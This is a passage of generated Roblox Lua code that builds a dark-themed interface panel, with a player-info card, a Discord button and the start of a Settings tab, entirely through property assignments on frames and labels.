G2L["3f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3f"]["Size"] = UDim2.new(0, 360, 0, 255);
G2L["3f"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3f"]["Position"] = UDim2.new(0.01351, 0, 0.01887, 0);
G2L["3f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3f"]["ScrollBarThickness"] = 0;
G2L["3f"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.rightside
G2L["40"] = Instance.new("Frame", G2L["3f"]);
G2L["40"]["BorderSizePixel"] = 0;
G2L["40"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["40"]["Size"] = UDim2.new(0, 176, 0, 255);
G2L["40"]["Position"] = UDim2.new(0.51081, 0, 0, 0);
G2L["40"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["40"]["Name"] = [[rightside]];
G2L["40"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.rightside.UIListLayout
G2L["41"] = Instance.new("UIListLayout", G2L["40"]);
G2L["41"]["Padding"] = UDim.new(0, 5);
G2L["41"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside
G2L["42"] = Instance.new("Frame", G2L["3f"]);
G2L["42"]["BorderSizePixel"] = 0;
G2L["42"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["42"]["Size"] = UDim2.new(0, 176, 0, 255);
G2L["42"]["Position"] = UDim2.new(-0.00038, 0, 0, 0);
G2L["42"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["42"]["Name"] = [[leftside]];
G2L["42"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.UIListLayout
G2L["43"] = Instance.new("UIListLayout", G2L["42"]);
G2L["43"]["Padding"] = UDim.new(0, 5);
G2L["43"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab
G2L["44"] = Instance.new("Frame", G2L["42"]);
G2L["44"]["BorderSizePixel"] = 0;
G2L["44"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
G2L["44"]["Size"] = UDim2.new(0, 176, 0, 160);
G2L["44"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["44"]["Name"] = [[playerinfoTab]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfoScript
G2L["45"] = Instance.new("LocalScript", G2L["44"]);
G2L["45"]["Name"] = [[playerinfoScript]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.UIListLayout
G2L["46"] = Instance.new("UIListLayout", G2L["44"]);
G2L["46"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
G2L["46"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.======ACCENT======
G2L["47"] = Instance.new("Frame", G2L["44"]);
G2L["47"]["BorderSizePixel"] = 0;
G2L["47"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["47"]["Size"] = UDim2.new(1, 0, 0, 4);
G2L["47"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["47"]["Name"] = [[======ACCENT======]];
G2L["47"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.======ACCENT======.GuiColor
G2L["48"] = Instance.new("Frame", G2L["47"]);
G2L["48"]["BorderSizePixel"] = 0;
G2L["48"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
G2L["48"]["Size"] = UDim2.new(1, -2, 0, 2);
G2L["48"]["Position"] = UDim2.new(0, 1, 0, 1);
G2L["48"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["48"]["Name"] = [[GuiColor]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.======ACCENT======.GuiColor.UICorner
G2L["49"] = Instance.new("UICorner", G2L["48"]);



-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.======TITLE======
G2L["4a"] = Instance.new("Frame", G2L["44"]);
G2L["4a"]["BorderSizePixel"] = 0;
G2L["4a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4a"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["4a"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["4a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4a"]["Name"] = [[======TITLE======]];
G2L["4a"]["LayoutOrder"] = 1;
G2L["4a"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.======TITLE======.text
G2L["4b"] = Instance.new("TextLabel", G2L["4a"]);
G2L["4b"]["TextWrapped"] = true;
G2L["4b"]["BorderSizePixel"] = 0;
G2L["4b"]["TextSize"] = 14;
G2L["4b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["4b"]["TextTransparency"] = 0.3;
G2L["4b"]["TextScaled"] = true;
G2L["4b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4b"]["BackgroundTransparency"] = 1;
G2L["4b"]["Size"] = UDim2.new(1, 0, -0.13333, 15);
G2L["4b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4b"]["Text"] = [[Welcome,]];
G2L["4b"]["Name"] = [[text]];
G2L["4b"]["Position"] = UDim2.new(0.02273, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.======TITLE======.text.text
G2L["4c"] = Instance.new("UIStroke", G2L["4b"]);
G2L["4c"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.======TITLE======.text.UIPadding
G2L["4d"] = Instance.new("UIPadding", G2L["4b"]);
G2L["4d"]["PaddingLeft"] = UDim.new(0, 1);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.greystroke
G2L["4e"] = Instance.new("UIStroke", G2L["44"]);
G2L["4e"]["ZIndex"] = 99;
G2L["4e"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["4e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["4e"]["Name"] = [[greystroke]];
G2L["4e"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo
G2L["4f"] = Instance.new("Frame", G2L["44"]);
G2L["4f"]["BorderSizePixel"] = 0;
G2L["4f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4f"]["Size"] = UDim2.new(1, 0, 0, 70);
G2L["4f"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
G2L["4f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4f"]["Name"] = [[playerinfo]];
G2L["4f"]["LayoutOrder"] = 2;
G2L["4f"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.playerinfo
G2L["50"] = Instance.new("LocalScript", G2L["4f"]);
G2L["50"]["Name"] = [[playerinfo]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.UIPadding
G2L["51"] = Instance.new("UIPadding", G2L["4f"]);
G2L["51"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.display
G2L["52"] = Instance.new("TextLabel", G2L["4f"]);
G2L["52"]["TextWrapped"] = true;
G2L["52"]["ZIndex"] = 10;
G2L["52"]["BorderSizePixel"] = 0;
G2L["52"]["TextSize"] = 14;
G2L["52"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["52"]["TextScaled"] = true;
G2L["52"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["52"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["52"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["52"]["BackgroundTransparency"] = 1;
G2L["52"]["Size"] = UDim2.new(0, 100, 0, 13);
G2L["52"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["52"]["Text"] = [[XXXXX]];
G2L["52"]["Name"] = [[display]];
G2L["52"]["Position"] = UDim2.new(0, 0, 0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.display.UIPadding
G2L["53"] = Instance.new("UIPadding", G2L["52"]);
G2L["53"]["PaddingLeft"] = UDim.new(0, 6);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.display.text
G2L["54"] = Instance.new("UIStroke", G2L["52"]);
G2L["54"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.username
G2L["55"] = Instance.new("TextLabel", G2L["4f"]);
G2L["55"]["TextWrapped"] = true;
G2L["55"]["ZIndex"] = 10;
G2L["55"]["BorderSizePixel"] = 0;
G2L["55"]["TextSize"] = 14;
G2L["55"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["55"]["TextScaled"] = true;
G2L["55"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["55"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["55"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["55"]["BackgroundTransparency"] = 1;
G2L["55"]["Size"] = UDim2.new(0, 100, 0, 13);
G2L["55"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["55"]["Text"] = [[@xxxxx]];
G2L["55"]["Name"] = [[username]];
G2L["55"]["Position"] = UDim2.new(0, 0, 0, 17);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.username.UIPadding
G2L["56"] = Instance.new("UIPadding", G2L["55"]);
G2L["56"]["PaddingLeft"] = UDim.new(0, 6);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.username.text
G2L["57"] = Instance.new("UIStroke", G2L["55"]);
G2L["57"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.joindate
G2L["58"] = Instance.new("TextLabel", G2L["4f"]);
G2L["58"]["TextWrapped"] = true;
G2L["58"]["ZIndex"] = 10;
G2L["58"]["BorderSizePixel"] = 0;
G2L["58"]["TextSize"] = 12;
G2L["58"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["58"]["TextScaled"] = true;
G2L["58"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["58"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["58"]["TextColor3"] = Color3.fromRGB(201, 201, 201);
G2L["58"]["BackgroundTransparency"] = 1;
G2L["58"]["Size"] = UDim2.new(1, 0, 0, 13);
G2L["58"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["58"]["Text"] = [[🗓️ XXXX-X-X (X days)]];
G2L["58"]["Name"] = [[joindate]];
G2L["58"]["Position"] = UDim2.new(0, 0, 0, 53);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.joindate.UIPadding
G2L["59"] = Instance.new("UIPadding", G2L["58"]);
G2L["59"]["PaddingLeft"] = UDim.new(0, 6);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.joindate.text
G2L["5a"] = Instance.new("UIStroke", G2L["58"]);
G2L["5a"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.profile
G2L["5b"] = Instance.new("ImageLabel", G2L["4f"]);
G2L["5b"]["BorderSizePixel"] = 0;
G2L["5b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5b"]["Image"] = [[rbxasset://textures/ui/GuiImagePlaceholder.png]];
G2L["5b"]["Size"] = UDim2.new(0, 50, 0, 50);
G2L["5b"]["Visible"] = false;
G2L["5b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5b"]["BackgroundTransparency"] = 1;
G2L["5b"]["Name"] = [[profile]];
G2L["5b"]["Position"] = UDim2.new(0, 110, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.profile.UICorner
G2L["5c"] = Instance.new("UICorner", G2L["5b"]);



-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.role
G2L["5d"] = Instance.new("TextLabel", G2L["4f"]);
G2L["5d"]["TextWrapped"] = true;
G2L["5d"]["ZIndex"] = 10;
G2L["5d"]["BorderSizePixel"] = 0;
G2L["5d"]["TextSize"] = 12;
G2L["5d"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["5d"]["TextTransparency"] = 0.3;
G2L["5d"]["TextScaled"] = true;
G2L["5d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5d"]["BackgroundTransparency"] = 1;
G2L["5d"]["Size"] = UDim2.new(0, 100, 0, 13);
G2L["5d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5d"]["Text"] = [[(USER)]];
G2L["5d"]["Name"] = [[role]];
G2L["5d"]["Position"] = UDim2.new(0, 0, 0, 34);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.role.UIPadding
G2L["5e"] = Instance.new("UIPadding", G2L["5d"]);
G2L["5e"]["PaddingLeft"] = UDim.new(0, 6);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.role.text
G2L["5f"] = Instance.new("UIStroke", G2L["5d"]);
G2L["5f"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.---DIVIDER---
G2L["60"] = Instance.new("Frame", G2L["44"]);
G2L["60"]["BorderSizePixel"] = 0;
G2L["60"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["60"]["Size"] = UDim2.new(1, 0, 0, 10);
G2L["60"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["60"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["60"]["Name"] = [[---DIVIDER---]];
G2L["60"]["LayoutOrder"] = 3;
G2L["60"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.---DIVIDER---.dividerFrame
G2L["61"] = Instance.new("Frame", G2L["60"]);
G2L["61"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["61"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["61"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["61"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["61"]["Name"] = [[dividerFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.---DIVIDER---.dividerFrame.outlineStroke
G2L["62"] = Instance.new("UIStroke", G2L["61"]);
G2L["62"]["Thickness"] = 2;
G2L["62"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.---DIVIDER---.dividerFrame.buttonFade
G2L["63"] = Instance.new("CanvasGroup", G2L["61"]);
G2L["63"]["BorderSizePixel"] = 0;
G2L["63"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["63"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["63"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["63"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["63"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.---DIVIDER---.dividerFrame.buttonFade.UIGradient
G2L["64"] = Instance.new("UIGradient", G2L["63"]);
G2L["64"]["Rotation"] = 90;
G2L["64"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.---DIVIDER---.dividerFrame.UIStroke
G2L["65"] = Instance.new("UIStroke", G2L["61"]);
G2L["65"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["65"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.---DIVIDER---.dividerFrame.UICorner
G2L["66"] = Instance.new("UICorner", G2L["61"]);



-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.---DIVIDER---.UIPadding
G2L["67"] = Instance.new("UIPadding", G2L["60"]);
G2L["67"]["PaddingTop"] = UDim.new(0, 3);
G2L["67"]["PaddingRight"] = UDim.new(0, 6);
G2L["67"]["PaddingLeft"] = UDim.new(0, 6);
G2L["67"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.discord
G2L["68"] = Instance.new("Frame", G2L["44"]);
G2L["68"]["BorderSizePixel"] = 0;
G2L["68"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["68"]["Size"] = UDim2.new(1, 0, 0, 23);
G2L["68"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["68"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["68"]["Name"] = [[discord]];
G2L["68"]["LayoutOrder"] = 4;
G2L["68"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.discord.button
G2L["69"] = Instance.new("TextButton", G2L["68"]);
G2L["69"]["BorderSizePixel"] = 0;
G2L["69"]["TextTransparency"] = 1;
G2L["69"]["TextSize"] = 14;
G2L["69"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["69"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["69"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["69"]["ZIndex"] = 49;
G2L["69"]["BackgroundTransparency"] = 1;
G2L["69"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["69"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["69"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.discord.button.UIPadding
G2L["6a"] = Instance.new("UIPadding", G2L["69"]);
G2L["6a"]["PaddingTop"] = UDim.new(0, 2);
G2L["6a"]["PaddingRight"] = UDim.new(0, 3);
G2L["6a"]["PaddingLeft"] = UDim.new(0, 3);
G2L["6a"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.discord.button.buttonFrame
G2L["6b"] = Instance.new("Frame", G2L["69"]);
G2L["6b"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["6b"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["6b"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["6b"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["6b"]["Name"] = [[buttonFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.discord.button.buttonFrame.outlineStroke
G2L["6c"] = Instance.new("UIStroke", G2L["6b"]);
G2L["6c"]["Thickness"] = 2;
G2L["6c"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.discord.button.buttonFrame.buttonFade
G2L["6d"] = Instance.new("CanvasGroup", G2L["6b"]);
G2L["6d"]["BorderSizePixel"] = 0;
G2L["6d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6d"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6d"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["6d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6d"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.discord.button.buttonFrame.buttonFade.UIGradient
G2L["6e"] = Instance.new("UIGradient", G2L["6d"]);
G2L["6e"]["Rotation"] = 90;
G2L["6e"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.discord.button.text
G2L["6f"] = Instance.new("TextLabel", G2L["69"]);
G2L["6f"]["ZIndex"] = 2;
G2L["6f"]["BorderSizePixel"] = 0;
G2L["6f"]["TextSize"] = 14;
G2L["6f"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6f"]["TextColor3"] = Color3.fromRGB(0, 124, 255);
G2L["6f"]["BackgroundTransparency"] = 1;
G2L["6f"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["6f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6f"]["Text"] = [[Join my discord!]];
G2L["6f"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.discord.button.text.text
G2L["70"] = Instance.new("UIStroke", G2L["6f"]);
G2L["70"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.discord.fillbar
G2L["71"] = Instance.new("Frame", G2L["68"]);
G2L["71"]["ZIndex"] = 90;
G2L["71"]["BorderSizePixel"] = 0;
G2L["71"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["71"]["Size"] = UDim2.new(0, 0, 1, 0);
G2L["71"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["71"]["Name"] = [[fillbar]];
G2L["71"]["BackgroundTransparency"] = 0.95;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings
G2L["72"] = Instance.new("ScrollingFrame", G2L["3e"]);
G2L["72"]["Visible"] = false;
G2L["72"]["Active"] = true;
G2L["72"]["BorderSizePixel"] = 0;
G2L["72"]["CanvasSize"] = UDim2.new(0, 0, 1.5, 0);
G2L["72"]["Name"] = [[Settings]];
G2L["72"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["72"]["Size"] = UDim2.new(0, 360, 0, 255);
G2L["72"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["72"]["Position"] = UDim2.new(0.01351, 0, 0.01887, 0);
G2L["72"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["72"]["ScrollBarThickness"] = 0;
G2L["72"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside
G2L["73"] = Instance.new("Frame", G2L["72"]);
G2L["73"]["BorderSizePixel"] = 0;
G2L["73"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["73"]["Size"] = UDim2.new(0, 176, 0, 255);
G2L["73"]["Position"] = UDim2.new(0.51081, 0, 0, 0);
G2L["73"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["73"]["Name"] = [[rightside]];
G2L["73"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.UIListLayout
G2L["74"] = Instance.new("UIListLayout", G2L["73"]);
G2L["74"]["Padding"] = UDim.new(0, 5);
G2L["74"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.moreTab
G2L["75"] = Instance.new("Frame", G2L["73"]);
G2L["75"]["BorderSizePixel"] = 0;
G2L["75"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
G2L["75"]["Size"] = UDim2.new(0, 176, 0, 160);
G2L["75"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["75"]["Name"] = [[moreTab]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.moreTab.moreScript
G2L["76"] = Instance.new("LocalScript", G2L["75"]);
G2L["76"]["Name"] = [[moreScript]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.moreTab.UIListLayout
G2L["77"] = Instance.new("UIListLayout", G2L["75"]);
G2L["77"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
G2L["77"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.moreTab.greystroke
G2L["78"] = Instance.new("UIStroke", G2L["75"]);
G2L["78"]["ZIndex"] = 99;
G2L["78"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["78"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["78"]["Name"] = [[greystroke]];
G2L["78"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.moreTab.======ACCENT======
G2L["79"] = Instance.new("Frame", G2L["75"]);
G2L["79"]["BorderSizePixel"] = 0;
G2L["79"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["79"]["Size"] = UDim2.new(1, 0, 0, 4);
G2L["79"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["79"]["Name"] = [[======ACCENT======]];
G2L["79"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.moreTab.======ACCENT======.GuiColor
G2L["7a"] = Instance.new("Frame", G2L["79"]);
G2L["7a"]["BorderSizePixel"] = 0;
G2L["7a"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
G2L["7a"]["Size"] = UDim2.new(1, -2, 0, 2);
G2L["7a"]["Position"] = UDim2.new(0, 1, 0, 1);
G2L["7a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7a"]["Name"] = [[GuiColor]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.moreTab.======ACCENT======.GuiColor.UICorner
G2L["7b"] = Instance.new("UICorner", G2L["7a"]);



-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.moreTab.======TITLE======
G2L["7c"] = Instance.new("Frame", G2L["75"]);
G2L["7c"]["BorderSizePixel"] = 0;
G2L["7c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7c"]["Size"] = UDim2.new(1, 0, 0, 15);
G2L["7c"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["7c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7c"]["Name"] = [[======TITLE======]];
G2L["7c"]["LayoutOrder"] = 1;
G2L["7c"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.moreTab.======TITLE======.text
G2L["7d"] = Instance.new("TextLabel", G2L["7c"]);
G2L["7d"]["TextWrapped"] = true;
G2L["7d"]["BorderSizePixel"] = 0;
